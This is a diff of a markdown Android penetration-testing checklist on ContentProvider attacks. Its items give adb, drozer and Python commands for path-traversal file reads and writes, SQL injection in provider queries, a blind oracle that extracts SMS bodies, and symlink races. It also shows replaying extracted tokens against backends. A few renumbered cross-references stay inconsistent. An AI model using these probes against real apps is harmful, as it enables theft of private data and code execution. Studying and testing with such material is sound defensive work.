+| `java.io.FileNotFoundException: No files supported by provider at ...` | cursor-only | D07-038, not traversal |
+| class extends `DocumentsProvider` | SAF | D07-064 |
+| class extends `SliceProvider` | Slice | D07-066 |
 
 - **Proof:** The classification plus the command output that produced it, recorded per authority.
 - **Escalation:** Routes the rest of the domain; a misclassification is how testers miss the Critical.
 - **Ruled out when:** n/a — classification always produces a result.
 
-### D07-029 · The encoding-variant matrix the scanners never send
+### D07-032 · The encoding-variant matrix the scanners never send
 
 | | |
 |---|---|
@@ -999,11 +1151,11 @@ done
   defeats prefix checks that only inspect the first segment.
 - **Proof:** The variant that returns bytes, alongside the variants that were rejected. The comparison
   demonstrates the specific sanitiser flaw, which is what the fix must address.
-- **Escalation:** -> D07-032 write side; -> D11/D13 for the payload.
+- **Escalation:** -> D07-035 write side; -> D11/D13 for the payload.
 - **Ruled out when:** All eight variants are rejected at both `read` and `write` modes and the
   canonicalisation check is visible in source.
 
-### D07-030 · Never accept `scanner.provider.traversal` reporting "Not Vulnerable"
+### D07-033 · Never accept `scanner.provider.traversal` reporting "Not Vulnerable"
 
 | | |
 |---|---|
@@ -1014,7 +1166,7 @@ done
 | **Maps to** | drozer `scanner/provider/traversal.py`, read directly: it calls `contentResolver().read(uri + "/../../../../../../../../../../../../../../../../etc/hosts")` and flags the URI **only** if the returned data is non-empty |
 
 - **Test:** The scanner sends exactly one payload against exactly one file, with a fixed 16-level prefix and
-  a non-empty-read oracle. Every one of D07-029's variants, every depth other than 16, and every target
+  a non-empty-read oracle. Every one of D07-032's variants, every depth other than 16, and every target
   other than `/etc/hosts` is invisible to it — and on images where `/etc/hosts` is unreadable or empty, its
   only oracle silently reads zero.
 - **How:**
@@ -1029,11 +1181,11 @@ drozer> run app.provider.download content://<auth>/a/../../../../data/data/com.t
 ```
 - **Proof:** A manual probe returning file content for a URI the scanner listed under `Not Vulnerable:`.
   Put both outputs side by side — the false negative is itself worth documenting for the client.
-- **Escalation:** -> D07-025.
+- **Escalation:** -> D07-028.
 - **Ruled out when:** n/a. Tool output is never a ruled-out basis; only the manual matrix plus the source
   check is.
 
-### D07-031 · `openFile()` that ignores the `mode` argument
+### D07-034 · `openFile()` that ignores the `mode` argument
 
 | | |
 |---|---|
@@ -1066,12 +1218,12 @@ adb shell content read  --uri 'content://com.target.app.provider/config'
 - **Proof:** The read succeeding through a write-mode request on a provider whose read is denied, or a write
   succeeding on a URI whose `readPermission`/`<path-permission>` implies read-only — verified by reading the
   file back and seeing your bytes.
-- **Escalation:** Write access to app-private config is a foothold -> D17; combine with D07-019 to locate
+- **Escalation:** Write access to app-private config is a foothold -> D17; combine with D07-022 to locate
   the branch on which the asymmetry exists.
 - **Ruled out when:** `openFile` calls `ParcelFileDescriptor.parseMode(mode)` and the provider declares a
   single `android:permission` covering both directions, and your `"w"` probe throws `SecurityException`.
 
-### D07-032 · Write-mode traversal into a code-load path
+### D07-035 · Write-mode traversal into a code-load path
 
 | | |
 |---|---|
@@ -1081,7 +1233,7 @@ adb shell content read  --uri 'content://com.target.app.provider/config'
 | **Applies to** | providers whose `open*` honours a write mode |
 | **Maps to** | CVE-2025-48636; Oversecured `TheftOverwriteProvider` (OVAA); Google Mobile VRP: "Path traversal / zip path traversal vulnerabilities leading to arbitrary file write" — and the explicit rule that "if you do not demonstrate this [ACE] in your report, the reward amount will not reflect this" |
 
-- **Test:** The same primitive as D07-025 in the other direction. The write alone underpays; plan the
+- **Test:** The same primitive as D07-028 in the other direction. The write alone underpays; plan the
   write-then-load chain from the start. Enumerate what the app loads before you choose a destination.
 - **How:**
 ```bash
@@ -1102,11 +1254,11 @@ adb logcat -s pwn:V
   initialiser on next launch. On a non-debuggable release build, prove it by the behaviour change instead
   and say which you used.
 - **Escalation:** -> D17 persistent code execution in the victim's UID. This is the Google Mobile VRP's
-  top-paying category; file the write as the primitive and the ACE as the consumer (D07-074).
+  top-paying category; file the write as the primitive and the ACE as the consumer (D07-076).
 - **Ruled out when:** Every `open*` method opens with a fixed read-only mode *and* the canonicalisation
   check is present, so both the `"w"` probe and the traversal probe fail.
 
-### D07-033 · `openFileHelper()` and the `_data` column — insert your own path, then open it
+### D07-036 · `openFileHelper()` and the `_data` column — insert your own path, then open it
 
 | | |
 |---|---|
@@ -1135,12 +1287,12 @@ adb shell content query  --uri content://media/external/file --projection _id,_d
 ```
 - **Proof:** A row you inserted whose `_data` names a victim-private path, followed by `content read` on
   that row's URI returning the file's bytes.
-- **Escalation:** -> D07-025's impact set; the write form of the same trick (insert a `_data` pointing at a
-  code path, then write through it) -> D07-032 -> D17.
+- **Escalation:** -> D07-028's impact set; the write form of the same trick (insert a `_data` pointing at a
+  code path, then write through it) -> D07-035 -> D17.
 - **Ruled out when:** `openFileHelper` is not used, or `insert`/`update` reject or overwrite `_data` (show
   the decompiled `ContentValues` sanitisation and a failed insert).
 
-### D07-034 · Symlink and TOCTOU against the provider's own canonicalisation
+### D07-037 · Symlink and TOCTOU against the provider's own canonicalisation
 
 | | |
 |---|---|
@@ -1169,12 +1321,12 @@ if (OsConstants.S_ISLNK(canonicalFileStat.st_mode)) return false
 val sameFile = pfdStat.st_dev == canonicalFileStat.st_dev && pfdStat.st_ino == canonicalFileStat.st_ino
 ```
 - **Proof:** The provider returning the symlink target's bytes. For the race, loop the swap and show a
-  non-zero hit rate over n>=10 attempts with the hit count reported (D07-046 applies).
-- **Escalation:** -> D07-025 impact; the write direction -> D17.
+  non-zero hit rate over n>=10 attempts with the hit count reported (D07-049 applies).
+- **Escalation:** -> D07-028 impact; the write direction -> D17.
 - **Ruled out when:** The provider performs the `fstat`/`lstat`/`S_ISLNK` comparison, or it only ever opens
   paths under a directory no other app can write (internal storage, no `<external-path>` entry).
 
-### D07-035 · Provider `selection` SQL injection — make the error hand you the query
+### D07-038 · Provider `selection` SQL injection — make the error hand you the query
 
 | | |
 |---|---|
@@ -1214,14 +1366,14 @@ grep -rn 'selectionArgs\|setStrict\|setProjectionMap' out/sources/   # absence i
   (`Row: 0 type=table, name=users, sql=CREATE TABLE users (...)`). Schema output is not obtainable without
   injection, which is why it is the cleanest demonstration.
 - **Escalation:** Dump the credential/session table, then write back through `content update` on the same
-  path (D07-039) — read plus write is the Critical.
+  path (D07-042) — read plus write is the Critical.
 - **Ruled out when:** Every caller-supplied string is passed through `selectionArgs` with `?` placeholders,
   **and** the quote probe returns rows or a clean empty cursor rather than a parser error, **and**
   `setStrictColumns`/`setStrictGrammar` or a `setProjectionMap` is present. Note the reachability
   qualifier: the same concatenation reachable only through the app's own UI is Low — you are injecting into
   your own database.
 
-### D07-036 · Projection injection is a separate sink from selection
+### D07-039 · Projection injection is a separate sink from selection
 
 | | |
 |---|---|
@@ -1255,7 +1407,7 @@ drozer> run scanner.provider.sqltables -a com.target.app
   or hardcodes the projection and ignores the caller's — show the decompiled line and the probe returning
   the fixed column set regardless of what you asked for.
 
-### D07-037 · `sortOrder` injection — the third sink nobody sends
+### D07-040 · `sortOrder` injection — the third sink nobody sends
 
 | | |
 |---|---|
@@ -1279,11 +1431,11 @@ adb shell content query --uri $A --sort "_id LIMIT 1 OFFSET 0--"
   condition is true.
 - **Proof:** A parser error naming `ORDER BY`, or a deterministic ordering flip between the true and false
   forms of the `CASE WHEN` probe, over a stable dataset. Diff the row sequences, not the row count.
-- **Escalation:** -> D07-046 to build the oracle properly; then the same extraction as D07-035.
+- **Escalation:** -> D07-049 to build the oracle properly; then the same extraction as D07-038.
 - **Ruled out when:** The provider ignores the caller's `sortOrder` (hardcoded `ORDER BY`) or validates it
   against an allow-list of column names — show the decompiled branch and the probe returning the fixed order.
 
-### D07-038 · URI path-segment injection into `appendWhere()`
+### D07-041 · URI path-segment injection into `appendWhere()`
 
 | | |
 |---|---|
@@ -1315,12 +1467,12 @@ count = db.delete(ProviderTableMeta.FILE_TABLE_NAME,
 - **Proof:** The query returning rows outside the intended selection (all rows instead of one), or a row
   count that changes with a boolean condition in the path segment. Include the `addURI` line showing the
   route uses `*`, not `#`.
-- **Escalation:** -> D07-035's extraction chain; the `delete()`/`update()` form is an integrity finding.
+- **Escalation:** -> D07-038's extraction chain; the `delete()`/`update()` form is an integrity finding.
 - **Ruled out when:** Every `UriMatcher` arm that feeds SQL uses `#` (digits only), or the segment is
   parsed through `Long.parseLong()`/`ContentUris.parseId()` before use — show the parse and the exception
   your non-numeric probe triggers.
 
-### D07-039 · Injection in `update()`/`delete()`/`insert()` selection — the blind boolean oracle
+### D07-042 · Injection in `update()`/`delete()`/`insert()` selection — the blind boolean oracle
 
 | | |
 |---|---|
@@ -1349,7 +1501,7 @@ adb shell content update --uri content://service-number/service_number --bind ro
   The oracle: TRUE if `update()` returns rows-affected > 0 **or** throws `UNIQUE constraint failed`; FALSE
   otherwise. Binary-search `[0..127]` per character with
   `1=1 AND unicode(substr((<subquery>), <idx>, 1)) BETWEEN <lo> AND <hi>`. Drive it from Python, not shell
-  (D07-008), and count the probes.
+  (D07-009), and count the probes.
 - **Proof:** Character-by-character reconstruction of an SMS body (or other protected row) by an app
   declaring **no** `READ_SMS`, with the rows-affected / `UNIQUE`-exception differential shown for a known
   true and a known false probe.
@@ -1360,7 +1512,7 @@ adb shell content update --uri content://service-number/service_number --bind ro
   write methods bind their selection through `selectionArgs` — and your known-true and known-false probes
   return the same rows-affected value.
 
-### D07-040 · Balanced-subquery injection that survives `setStrict(true)`
+### D07-043 · Balanced-subquery injection that survives `setStrict(true)`
 
 | | |
 |---|---|
@@ -1403,10 +1555,10 @@ WHERE (_id=? AND lookup=?)          -- the provider's ENTIRE grant enforcement
   running against your target, not just against Android 17.
 - **Ruled out when:** `setStrictGrammar(true)` (or `setStrictColumns(true)` with a projection map) is active
   for your caller and the identical payload throws `IllegalArgumentException: Invalid token SELECT` — prove
-  it with D07-041 rather than assuming. Platform gate for the CVE itself: Android 17, SPL < 2026-07-01,
+  it with D07-044 rather than assuming. Platform gate for the CVE itself: Android 17, SPL < 2026-07-01,
   caller `targetSdk <= 36`; Android 14/15/16 are unaffected because the gating code never existed there.
 
-### D07-041 · Establish whether strict SQL checking is on — your own negative control
+### D07-044 · Establish whether strict SQL checking is on — your own negative control
 
 | | |
 |---|---|
@@ -1424,7 +1576,7 @@ WHERE (_id=? AND lookup=?)          -- the provider's ENTIRE grant enforcement
 ```bash
 adb shell am compat enable 484953293 com.poc.stub
 # Enabled change 484953293 for com.poc.stub.
-# re-run the exact payload from D07-040
+# re-run the exact payload from D07-043
 adb shell am compat disable 484953293 com.poc.stub
 adb shell am compat reset 484953293 com.poc.stub
 ```
@@ -1432,12 +1584,12 @@ adb shell am compat reset 484953293 com.poc.stub
   `IllegalArgumentException: Invalid token SELECT` with the change enabled and returning the oracle result
   with it disabled. `setStrictGrammar(true)` tokenises the selection and rejects the `SELECT` keyword
   outright; this is the exact exception Google's CTS regression test asserts.
-- **Escalation:** -> D07-072 evidence package. A negative control of this quality is what makes a provider
+- **Escalation:** -> D07-075 evidence package. A negative control of this quality is what makes a provider
   injection undeniable at triage.
 - **Ruled out when:** n/a — this is a control, not a finding. If the compat change is unavailable on the
   build, say so and substitute a decompiled-source check for `setStrict*` calls.
 
-### D07-042 · Cross-provider SQL injection through a shared SQLite database
+### D07-045 · Cross-provider SQL injection through a shared SQLite database
 
 | | |
 |---|---|
@@ -1472,7 +1624,7 @@ query(Uri.parse("content://com.target.app.insensitive/"), null,
   constants), or all caller input is bound via `selectionArgs`. The remediation is also the test hint: apps
   that keep one database per provider cannot be unioned across.
 
-### D07-043 · Projection-map or caller check applied to only one `UriMatcher` branch
+### D07-046 · Projection-map or caller check applied to only one `UriMatcher` branch
 
 | | |
 |---|---|
@@ -1499,11 +1651,11 @@ Row: 0 _id=1, file_source=71580, share_type=3, path=/Nextcloud.mp4, token=rkNCkc
 - **Escalation:** This is the item where the local bug becomes a remote one. In #518669 the recovered share
   `token` forged `https://<server>/index.php/s/rkNCkcYcbGEBDQN`, which loaded the shared file
   unauthenticated from the internet -> D15. The forged URL, not the local read, is what makes it a real
-  finding; test every token-shaped column against the backend (D07-067).
+  finding; test every token-shaped column against the backend (D07-070).
 - **Ruled out when:** Every `UriMatcher` arm that serves a cursor passes through the same projection-map and
   the same caller check — show the shared helper both arms call.
 
-### D07-044 · `scanner.provider.injection` has a one-string oracle
+### D07-047 · `scanner.provider.injection` has a one-string oracle
 
 | | |
 |---|---|
@@ -1532,11 +1684,11 @@ drozer> run app.provider.query content://<auth>/users --selection "_id=1 OR 1=1-
 - **Proof:** Either the scanner's classification plus a working payload in that parameter only, or a manual
   hit on a URI the scanner listed clean. Note drozer is a degraded tool on modern devices — the
   `adb shell content` equivalents are the reliable ones.
-- **Escalation:** -> D07-035/-036.
+- **Escalation:** -> D07-038/-036.
 - **Ruled out when:** n/a. A clean scanner run is never the ruled-out basis; the `1=1`/`1=0` body diff plus
   the source check is.
 
-### D07-045 · Drive the provider surface through Burp with `auxiliary.webcontentresolver`
+### D07-048 · Drive the provider surface through Burp with `auxiliary.webcontentresolver`
 
 | | |
 |---|---|
@@ -1563,11 +1715,11 @@ curl 'http://127.0.0.1:8080/query?uri=content://com.target.app.provider/users&se
 ```
 - **Proof:** An Intruder run over `selection` producing a response-length delta that confirms a blind
   oracle, with the results table (payload, status, length) as the evidence.
-- **Escalation:** Automated confirmation -> full DB extraction -> D07-065.
+- **Escalation:** Automated confirmation -> full DB extraction -> D07-068.
 - **Ruled out when:** n/a — tooling. Note that everything it reaches, it reaches as drozer's app UID, which
   is the correct AM-03 framing (D07-007).
 
-### D07-046 · Oracle discipline — body-diff and the n>=10 interleaved sample
+### D07-049 · Oracle discipline — body-diff and the n>=10 interleaved sample
 
 | | |
 |---|---|
@@ -1610,9 +1762,9 @@ for k,v in res.items():
   statistical claim, with the suspect group's mean at least 2 sigma from the control's.
 - **Escalation:** n/a — this is a kill gate that converts a probable retraction into a defensible High.
 - **Ruled out when:** No differential survives the diff, or the two distributions overlap within 2 sigma.
-  Record the retraction per D07-073 rather than silently dropping it.
+  Record the retraction per D07-076 rather than silently dropping it.
 
-### D07-047 · Marker discipline for provider write and reflection claims
+### D07-050 · Marker discipline for provider write and reflection claims
 
 | | |
 |---|---|
@@ -1643,12 +1795,12 @@ adb logcat -d | grep "$M"
 - **Proof:** The marker present in the post-write artefact and absent from the baseline, both shown. Never
   use the target's own domain, `evil`, `payload`, `script` or `AAAA` as a marker.
 - **Escalation:** A marker that reaches a WebView -> D10 stored XSS; a marker that reaches the backend ->
-  D15 and D07-067.
+  D15 and D07-070.
 - **Ruled out when:** The marker appears in the baseline (word collision — pick another), or the post-write
   query does not contain it (the write silently failed, which many providers do by returning a URI without
   committing).
 
-### D07-048 · Provider that proxies a caller-supplied `content://` URI
+### D07-051 · Provider that proxies a caller-supplied `content://` URI
 
 | | |
 |---|---|
@@ -1691,7 +1843,7 @@ fun wasGrantedPermission(ctx: Context, uri: Uri?, grantFlag: Int): Boolean =
         PackageManager.PERMISSION_GRANTED
 ```
 
-### D07-049 · Provider forwarding to a system provider under the app's own permission
+### D07-052 · Provider forwarding to a system provider under the app's own permission
 
 | | |
 |---|---|
@@ -1701,7 +1853,7 @@ fun wasGrantedPermission(ctx: Context, uri: Uri?, grantFlag: Int): Boolean =
 | **Applies to** | apps holding a dangerous permission and exposing a provider |
 | **Maps to** | Oversecured Class #6/#31 provider-to-provider proxying; T1636 Protected User Data (.001–.005) |
 
-- **Test:** The narrower, more common cousin of D07-048: the provider does not take an arbitrary URI, it
+- **Test:** The narrower, more common cousin of D07-051: the provider does not take an arbitrary URI, it
   just serves a *fixed* system URI to whoever asks. An app that legitimately holds `READ_CONTACTS` and
   exposes `content://com.target.app.contacts` has re-delegated that permission to every installed app —
   permission laundering. The same pattern appears as a cache file on shared storage.
@@ -1721,12 +1873,12 @@ adb shell ls -la /sdcard/Android/data/com.target.app/files /sdcard/Download 2>/d
 - **Escalation:** SMS bodies readable by a zero-permission app -> OTP capture -> D13 account takeover.
   Contacts at scale -> D20.
 - **Ruled out when:** The app holds no dangerous permission whose data it re-serves, or the provider
-  enforces a `signature`-level permission on the re-serving path (verify the protectionLevel per D07-013).
+  enforces a `signature`-level permission on the re-serving path (verify the protectionLevel per D07-014).
   Note `MODE_WORLD_READABLE` throws from API 24 (**LEGACY**) and other apps cannot read
   `Android/data/<pkg>` on Android 11+ without All-Files-Access — check the actual API level before rating
   the file variant.
 
-### D07-050 · Fallback-response enumeration against a thumbnail or avatar deputy
+### D07-053 · Fallback-response enumeration against a thumbnail or avatar deputy
 
 | | |
 |---|---|
@@ -1760,12 +1912,12 @@ print(f"[count] probed={n} hits={hits}")
 PY
 ```
 - **Proof:** The hit list with byte counts and hashes, plus one rendered image proving it is a real object
-  belonging to someone else. The `[count]` line proves the sweep ran (D07-008).
+  belonging to someone else. The `[count]` line proves the sweep ran (D07-009).
 - **Escalation:** -> D15 if the ids are the backend's object ids; -> D20 for the privacy write-up.
 - **Ruled out when:** Every id returns the byte-identical fallback (hash equality across the sweep), or the
   deputy requires a per-object grant your app cannot obtain — show both the hash equality and the denial.
 
-### D07-051 · The app's own `ContentResolver` fed an attacker `file://` URI
+### D07-054 · The app's own `ContentResolver` fed an attacker `file://` URI
 
 | | |
 |---|---|
@@ -1807,7 +1959,7 @@ boolean ok = real.startsWith(Paths.get(ctx.getApplicationInfo().dataDir));
   whether the attacker can set `StrictMode.setVmPolicy(VmPolicy.LAX)` in their own process, which they can.
   The victim's acceptance is the bug, not the sender's policy.
 
-### D07-052 · MIME-type-only intent filters implicitly accept `content:` and `file:`
+### D07-055 · MIME-type-only intent filters implicitly accept `content:` and `file:`
 
 | | |
 |---|---|
@@ -1818,7 +1970,7 @@ boolean ok = real.startsWith(Paths.get(ctx.getApplicationInfo().dataDir));
 | **Maps to** | `guide/components/intents-filters` data-test rules, quoted: an intent passes the URI test if "it has a `content:` or `file:` URI and the filter does not specify a URI format. In other words, a component is presumed to support `content:` and `file:` data if its filter lists *only* a MIME type." |
 
 - **Test:** A filter declaring only `<data android:mimeType="image/*"/>` with no `scheme` is an open door
-  for `file://` and `content://` URIs, which is the delivery half of D07-051. Reviewers reading the
+  for `file://` and `content://` URIs, which is the delivery half of D07-054. Reviewers reading the
   manifest see a MIME filter and assume a scheme constraint that is not there.
 - **How:**
 ```bash
@@ -1830,12 +1982,12 @@ adb shell am start -a android.intent.action.SEND -t 'image/*' \
   -n com.target.app/.ShareTarget
 ```
 - **Proof:** The component accepting and processing the `file://` URI — a render, an upload, or a crash
-  naming the path. Pair it with D07-051 for the impact.
-- **Escalation:** -> D07-051 arbitrary read; -> D05 for the implicit-resolution half.
+  naming the path. Pair it with D07-054 for the impact.
+- **Escalation:** -> D07-054 arbitrary read; -> D05 for the implicit-resolution half.
 - **Ruled out when:** Every MIME-typed filter also declares `<data android:scheme="content"/>` (or the
   handler validates the scheme in code before opening), and your `file://` probe is rejected.
 
-### D07-053 · Non-exported provider reached through the app's own URI sink
+### D07-056 · Non-exported provider reached through the app's own URI sink
 
 | | |
 |---|---|
@@ -1862,13 +2014,13 @@ adb shell am start -n com.target.app/.ImportActivity \
 - **Proof:** The app copies its own private file into public storage, attaches it to an outbound message,
   or renders it — with the non-exported authority visible in the URI you supplied. Capture the resulting
   file or HTTP body.
-- **Escalation:** -> D08 for a cleaner delivery; -> D07-062 for the side-effect variant, where the sink is
+- **Escalation:** -> D08 for a cleaner delivery; -> D07-065 for the side-effect variant, where the sink is
   a `query()` on an internal debug URI.
 - **Ruled out when:** No externally-reachable component passes a caller-supplied `Uri` to
   `ContentResolver`, or every such path validates `belongsToCurrentApplication()` before opening. This is
   the check that must pass before any `exported="false"` provider goes into the ruled-out register.
 
-### D07-054 · FileProvider `<paths>` rooted at `/`, `.` or empty
+### D07-057 · FileProvider `<paths>` rooted at `/`, `.` or empty
 
 | | |
 |---|---|
@@ -1923,7 +2075,7 @@ adb shell content read --uri 'content://com.target.app.fileprovider/files/../dat
   and none is `root-path` or `path` in `{"", ".", "/"}` — and a probe for a sibling directory returns
   `IllegalArgumentException: Failed to find configured root that contains ...`.
 
-### D07-055 · `<external-path>` and the shared-volume exposure
+### D07-058 · `<external-path>` and the shared-volume exposure
 
 | | |
 |---|---|
@@ -1946,12 +2098,12 @@ adb shell content read --uri 'content://com.target.app.fileprovider/external/Dow
 ```
 - **Proof:** Your planted marker returned through the victim's authority, or a per-user document (invoice,
   KYC image, chat attachment) readable at rest on the shared volume.
-- **Escalation:** The attacker-writable half feeds D17 (the app imports its own "trusted" file) and D07-059.
+- **Escalation:** The attacker-writable half feeds D17 (the app imports its own "trusted" file) and D07-062.
   The readable half is a D11/D20 payload.
 - **Ruled out when:** No `external*` element exists, or every one names a subdirectory containing only
   non-sensitive, app-generated content that the app also treats as untrusted on read (show the validation).
 
-### D07-056 · `FileProvider.getUriForFile()` called with attacker-controlled input
+### D07-059 · `FileProvider.getUriForFile()` called with attacker-controlled input
 
 | | |
 |---|---|
@@ -1985,7 +2137,7 @@ adb shell am start -W -a android.intent.action.VIEW \
   the app generated itself (`File.createTempFile`, a UUID, a hash) — show the construction and a failed
   traversal attempt on the parameter you controlled.
 
-### D07-057 · Concede what FileProvider actually blocks — `files/` and `cache/`, not `shared_prefs/`
+### D07-060 · Concede what FileProvider actually blocks — `files/` and `cache/`, not `shared_prefs/`
 
 | | |
 |---|---|
@@ -2017,7 +2169,7 @@ adb shell content read --uri 'content://com.target.app.fileprovider/files/sessio
 - **Ruled out when:** `files/` and `cache/` contain nothing sensitive on a fully-exercised app (log in,
   use the main flows, then re-enumerate — a first-launch enumeration proves nothing).
 
-### D07-058 · `grantUriPermissions="true"` on a FileProvider is mandatory, not the defect
+### D07-061 · `grantUriPermissions="true"` on a FileProvider is mandatory, not the defect
 
 | | |
 |---|---|
@@ -2028,20 +2180,20 @@ adb shell content read --uri 'content://com.target.app.fileprovider/files/sessio
 | **Maps to** | MASTG-TEST-0250, MASTG-TEST-0357 — `android:grantUriPermissions` **must** be `true` for a FileProvider by definition, otherwise it throws `SecurityException: Provider must grant uri permissions` |
 
 - **Test:** Scanners and inexperienced testers file `grantUriPermissions="true"` on a FileProvider as a
-  finding. It is a functional requirement of the class. The defect is always the **path scope** (D07-054)
-  or the **grant delivery** (D07-021/-022), never the attribute's presence.
+  finding. It is a functional requirement of the class. The defect is always the **path scope** (D07-057)
+  or the **grant delivery** (D07-024/-022), never the attribute's presence.
 - **How:**
 ```bash
 grep -n -B2 -A6 'androidx.core.content.FileProvider\|android.support.v4.content.FileProvider' out/AndroidManifest.xml
 # confirm the class before judging the attribute
 ```
 - **Proof:** n/a — this is a filter. If the provider class is (or extends) `FileProvider`, drop the
-  attribute observation and go to D07-054.
+  attribute observation and go to D07-057.
 - **Escalation:** n/a.
 - **Ruled out when:** n/a. Note the inverse is a real signal: `grantUriPermissions="true"` on a provider
-  that is **not** a FileProvider is a deliberate choice and goes to D07-021.
+  that is **not** a FileProvider is a deliberate choice and goes to D07-024.
 
-### D07-059 · Dirty Stream — trusting `DISPLAY_NAME` from a foreign ContentProvider
+### D07-062 · Dirty Stream — trusting `DISPLAY_NAME` from a foreign ContentProvider
 
 | | |
 |---|---|
@@ -2102,7 +2254,7 @@ startActivity(i);
   guard written for file paths "always returns true for a content URI" because normalisation turns it into
   `/content:/` — so the presence of a validation helper is not sufficient; read what it actually compares.
 
-### D07-060 · Implicit-intent result interception returning a `file://` URI
+### D07-063 · Implicit-intent result interception returning a `file://` URI
 
 | | |
 |---|---|
@@ -2115,7 +2267,7 @@ startActivity(i);
 - **Test:** The victim launches a picker; a malicious responder returns a `file://` URI pointing at the
   victim's own private file; the victim copies it somewhere you can read. Registering a high-priority
   exported responder for the picker action is the whole attacker setup. This is the read direction; the
-  write direction is D07-059's `DISPLAY_NAME`.
+  write direction is D07-062's `DISPLAY_NAME`.
 - **How:**
 ```bash
 grep -rnE 'startActivityForResult\(.*(ACTION_PICK|ACTION_GET_CONTENT|IMAGE_CAPTURE|ACTION_CROP|OPEN_DOCUMENT)' out/sources/
@@ -2134,12 +2286,12 @@ finish();
   (`/sdcard/Android/data/com.target.app/cache/...` or a public dir), dumped by your PoC with the token
   visible. Show the pre-state (file absent) and post-state (file present with the victim's content).
 - **Escalation:** -> D11/D13. The write variant of the same interception (returning a provider whose
-  `DISPLAY_NAME` traverses) -> D07-059 -> D17.
+  `DISPLAY_NAME` traverses) -> D07-062 -> D17.
 - **Ruled out when:** `onActivityResult` rejects the `file` scheme, resolves the real path via
   `openFileDescriptor` + `/proc/self/fd` `readSymbolicLink` and checks it is under `dataDir`, or writes the
   received data to internal storage only and never to a location another app can read.
 
-### D07-061 · DocumentsProvider / SAF restore-import traversal in the consumer
+### D07-064 · DocumentsProvider / SAF restore-import traversal in the consumer
 
 | | |
 |---|---|
@@ -2184,7 +2336,7 @@ adb push evil.zip /sdcard/ && adb shell am start -a android.intent.action.VIEW \
   the zip variant, the app targets 34+ with `ZipPathValidator` active *and* the provider-id variant is also
   guarded.
 
-### D07-062 · Side-effecting logic inside provider methods
+### D07-065 · Side-effecting logic inside provider methods
 
 | | |
 |---|---|
@@ -2210,13 +2362,13 @@ adb shell ls -la /sdcard/Download /sdcard/Android/data/com.target.app/files
 - **Proof:** The side-effect artefact appearing (a database copy in `Downloads`, a log file, a re-issued
   token) and you reading it. Show the directory listing before and after.
 - **Escalation:** When the provider is not exported, chain a URI sink so the victim calls
-  `ContentResolver.query(content://com.target.app.internal/debug)` on itself (D07-053) — `exported="false"`
+  `ContentResolver.query(content://com.target.app.internal/debug)` on itself (D07-056) — `exported="false"`
   is insufficient the moment the app feeds itself attacker URIs.
 - **Ruled out when:** Every provider method is a pure data operation — no filesystem writes outside the
   provider's own backing store, no process execution, no credential mutation — verified by reading each
   `UriMatcher` arm and each `call()` branch, not by testing a sample of URIs.
 
-### D07-063 · Exported `SliceProvider` whose `onBindSlice` acts on the URI
+### D07-066 · Exported `SliceProvider` whose `onBindSlice` acts on the URI
 
 | | |
 |---|---|
@@ -2245,7 +2397,7 @@ adb shell content query --uri 'content://com.target.app/account/balance'
 - **Ruled out when:** No `SliceProvider` subclass exists, or `onBindSlice` returns only static content and
   calls `checkSlicePermission` before any data-bearing branch.
 
-### D07-064 · `CloudMediaProvider` inside the Photo Picker
+### D07-067 · `CloudMediaProvider` inside the Photo Picker
 
 | | |
 |---|---|
@@ -2267,14 +2419,14 @@ adb shell dumpsys package com.target.app | grep -i cloud
 ```
 - **Proof:** A `CloudMediaProvider` subclass returning items without verifying the requesting selection
   context — i.e. media outside the user's current selection returned to a caller.
-- **Escalation:** -> D07-069 for the MediaStore side; -> D20 for bulk media disclosure.
+- **Escalation:** -> D07-072 for the MediaStore side; -> D20 for bulk media disclosure.
 - **Ruled out when:** No `CloudMediaProvider` subclass and no `CLOUD_MEDIA` action in the manifest. Related
   and worth one command while you are here: an app that requests `READ_MEDIA_IMAGES`/`_VIDEO`/`_AUDIO` and
   enumerates `MediaStore` instead of using the picker (which needs **no** permission) is over-collecting —
   `adb shell pm revoke com.target.app android.permission.READ_MEDIA_IMAGES` and see whether the feature
   still works through the picker.
 
-### D07-065 · Rate the provider by what the rows contain, not by the fact it is exported
+### D07-068 · Rate the provider by what the rows contain, not by the fact it is exported
 
 | | |
 |---|---|
@@ -2304,13 +2456,13 @@ done
   bcrypt hashes of password-protected share passwords plus the share token (crackable offline, bypassing
   the server's brute-force protection entirely); E2EE private keys; a printer's factory admin password,
   MAC address and WPA2-PSK material returned by a single `content query`.
-- **Escalation:** -> D07-067 (take every token and identifier to the backend). Credential material ->
+- **Escalation:** -> D07-070 (take every token and identifier to the backend). Credential material ->
   D12 offline cracking; other users' rows -> D15 IDOR.
 - **Ruled out when:** Every reachable column holds content the app publishes anyway (public catalogue,
   static config, the device's own locale), and no column is an identifier the backend accepts. State the
   column inventory in the ruled-out register, not just "nothing sensitive".
 
-### D07-066 · Chain two providers — one names the object, the other returns its bytes
+### D07-069 · Chain two providers — one names the object, the other returns its bytes
 
 | | |
 |---|---|
@@ -2339,10 +2491,10 @@ grep -rn 'android:authorities' out/AndroidManifest.xml | grep -iE 'cache|image|t
 - **Escalation:** Thumbnails rate Low; full-resolution content, documents or KYC images rate Medium+ ->
   D11/D20. Check every `*CacheFileProvider` / `*ImageProvider` / `*PreviewProvider` authority for the same
   join.
-- **Ruled out when:** The cache/thumbnail authority is not exported and has no grant path (D07-021/-022), or
+- **Ruled out when:** The cache/thumbnail authority is not exported and has no grant path (D07-024/-022), or
   it requires an opaque per-object token that the metadata provider does not return.
 
-### D07-067 · Take provider rows to the backend — the mobile-to-backend shadow-API bridge
+### D07-070 · Take provider rows to the backend — the mobile-to-backend shadow-API bridge
 
 | | |
 |---|---|
@@ -2389,7 +2541,7 @@ curl -s -o /dev/null -w '%{http_code}\n' "https://target.example/index.php/s/rkN
   extracted token is rejected off-device with a 401 that a valid token does not produce — show both the
   401 and a control 200.
 
-### D07-068 · The Downloads provider and the signed URL that outlives the session
+### D07-071 · The Downloads provider and the signed URL that outlives the session
 
 | | |
 |---|---|
@@ -2416,12 +2568,12 @@ adb shell content query --uri content://downloads/all_downloads
   `content://downloads/my_downloads` row whose `uri` contains `?token=`/`?sig=`/`X-Amz-Signature` that still
   returns 200 when replayed with `curl` from another machine. Replay it off-device — that is what separates
   metadata disclosure from a real finding.
-- **Escalation:** -> D07-067 (the signed URL is a backend credential); the public download directory is also
-  a **write** target, so chain it to the app's own import routine (D07-061).
+- **Escalation:** -> D07-070 (the signed URL is a backend credential); the public download directory is also
+  a **write** target, so chain it to the app's own import routine (D07-064).
 - **Ruled out when:** Downloads go to `setDestinationInExternalFilesDir` (app-scoped) or an internal path,
